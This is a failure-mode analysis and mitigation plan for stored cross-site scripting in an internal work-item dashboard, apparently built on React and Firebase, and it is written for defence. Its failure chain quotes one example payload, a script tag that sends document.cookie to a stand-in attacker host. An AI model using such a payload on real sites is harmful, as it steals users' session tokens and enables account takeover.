# Failure: XSS via Unsanitized Work Item Content

## Summary

Work item fields (name, description, comments) are rendered in other users' browsers. If this content is not properly sanitized, a team member with malicious intent (or a compromised account) could inject a script that executes in colleagues' browsers — potentially exfiltrating auth tokens, performing actions on their behalf, or defacing the dashboard.

## Failure Chain

1. A team member posts a work item containing malicious script content in the name, description, or comment field (e.g., `<script>fetch('https://evil.com/?t=' + document.cookie)</script>`).
   - *Intervention point (prevention):* React's JSX rendering escapes HTML by default — using `{variable}` in JSX does not execute scripts. This failure only occurs if `dangerouslySetInnerHTML` is used, or if a markdown renderer or rich-text field renders raw HTML.

2. Another employee opens the dashboard. The malicious content is rendered in their browser.

3. The injected script executes in their browser context. **Harm begins.**
   - *Possible harms:* exfiltration of Firebase auth tokens or session data; actions performed on behalf of the victim; dashboard defaced for that user.

4. The attacker uses the exfiltrated data to impersonate the victim or access other company systems that accept those credentials.

5. **Harm ends** when affected sessions are invalidated and the malicious content is removed.

## Observations

- **Severity:** Medium-High if triggered — the blast radius is all company employees who view the dashboard (potentially the entire company).
- **Likelihood is low** if React is used correctly: JSX escapes content by default. The risk increases if rich text, markdown rendering, or `dangerouslySetInnerHTML` is introduced.
- **Scope creep risk:** Comments are in the data model as nice-to-have. If comments evolve to support markdown or rich text, this failure becomes more likely. Keep comment rendering as plain text.
- **Related failures:** Failure 02 (auth/access) — XSS could lead to account takeover, enabling unauthorized writes.
- **Variants grouped here:**
  - *XSS via unsanitized work item content*

## Intervention Points

### Prevention
- Use React JSX with `{variable}` rendering only — never `dangerouslySetInnerHTML` for user content
- If markdown is ever added: use a sanitizing renderer (e.g., DOMPurify) — never raw HTML
- Content Security Policy (CSP) headers restricting script sources to known origins
- Input length limits on all text fields (limits payload size)

### Detection
- Content moderation is impractical for an internal tool; rely on prevention
- Firebase security rules audit log can identify when and by whom a malicious item was posted

### Mitigation
- Any authenticated user can delete any item that appears malicious (or admin-only delete)
- Immediate: take down the affected content; invalidate all active sessions

### Recovery
- Identify the item and poster via audit log; remove content
- Invalidate all active Firebase sessions (via Firebase Auth admin API)
- Assess what data (if any) was exfiltrated; notify affected users

---

## Management Plan

[Not yet developed. Run failure management to develop a plan for this failure mode.]

## Management Plan

### Strategy

Prevention-first with defense-in-depth. The XSS risk is effectively eliminated by the rendering approach (JSX-only, no dangerouslySetInnerHTML) and CSP headers. This is a case where correct implementation of standard practices reduces residual risk to near-zero. The strategy codifies these as documented constraints — enforced in code review and documented as a restriction that must be respected if the codebase evolves.

### Planned Interventions

- **JSX-only rendering, documented as a permanent constraint** — all user-generated content is rendered via React JSX interpolation (`{variable}`). `dangerouslySetInnerHTML` is explicitly prohibited for any user content field. This is documented in the project README and enforced in code review.
  - Type: Prevention
  - Covers: chain steps 1–3 — JSX escaping means injected script tags are rendered as text, never executed

- **Plain-text comments only** — comments are stored and rendered as plain text. No markdown, no rich text, no HTML rendering for comments. If markdown is ever added, a sanitizing renderer (DOMPurify) is required before merging — documented as a constraint.
  - Type: Prevention
  - Covers: chain step 1 (payload injection) — limits the injection surface to simple text fields

- **Input length limits enforced server-side** — Firestore security rules (or Cloud Function validation) enforce: name ≤200 chars, description ≤2000 chars, comment ≤500 chars. Limits payload size even if rendering were ever misconfigured.
  - Type: Prevention (defense-in-depth)
  - Covers: chain step 1 — reduces attack surface

- **Content Security Policy headers** — Firebase Hosting `firebase.json` configures CSP headers:
  `Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com https://www.gstatic.com; ...`
  This prevents any injected script from loading external resources or exfiltrating data even if the rendering constraint were ever violated.
  - Type: Mitigation (defense-in-depth)
  - Covers: chain step 3 — limits blast radius of any successful injection

- **Firestore audit log** — Firestore's built-in write log records who wrote what and when. If a malicious item is discovered, the audit log identifies the source account immediately.
  - Type: Detection
  - Covers: chain step 1 — provenance of any malicious content is traceable

- **Admin delete + session invalidation procedure** — documented in ops runbook: (a) named owner can delete any item from Firestore console; (b) if a session compromise is suspected, all active Firebase Auth sessions can be revoked via the Firebase Admin SDK. Steps and commands included in the runbook.
  - Type: Recovery
  - Covers: chain steps 4–5 — limits harm duration and enables fast containment

### Accepted Risks

With JSX rendering and CSP headers in place, the residual XSS risk is very low. The primary residual is: a future developer, unfamiliar with this constraint, adds a rich-text field using `dangerouslySetInnerHTML` or an unsanitized markdown renderer. Mitigated by: documented constraint in README, code review awareness, and the CSP headers as a fallback that would limit (though not eliminate) the blast radius.

### Monitoring

- Code review: any PR adding a text rendering component is reviewed for `dangerouslySetInnerHTML` usage
- Dependency audit: if a markdown or rich-text library is added as a dependency, this triggers a security review of how its output is rendered
- No automated runtime monitoring needed at this scale; Firestore audit log is available on-demand if an incident is reported
